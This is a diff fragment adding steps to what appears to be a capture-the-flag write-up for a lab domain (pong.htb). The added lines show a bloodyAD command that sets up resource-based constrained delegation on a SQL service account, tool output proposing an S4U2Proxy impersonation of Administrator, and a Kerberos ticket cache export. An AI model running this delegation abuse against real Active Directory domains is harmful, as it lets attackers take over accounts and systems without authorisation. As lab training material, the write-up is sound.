@@ -812,5 +812,16 @@ I have GenericWrite on these three service accounts, and checking writable objec
 Ill target the sql service account and setup RBCD
 
 ```python
+❯❯❯ faketime -f +8h bloodyAD --host dc2.pong.htb -d pong.htb -k add rbcd 'svc_sql' 'pong_gmsa$' 
+[!] No security descriptor has been returned, a new one will be created
+[+] pong_gmsa$ can now impersonate users on svc_sql via S4U2Proxy
+[+] e.g. badS4U2proxy 'kerberos+ccache://pong.htb\None:c.carlssen.ccache@dc2.pong.htb/?serverip=192.168.2.2&dc=192.168.2.2' 'HOST/svc_sql@pong.htb' 'Administrator@pong.htb'
+```
+
+Ill configure RBCD on the sql service account
+
+```python
+❯❯❯ export KRB5CCNAME=pong_gmsa.ccache 
+
 
 ```
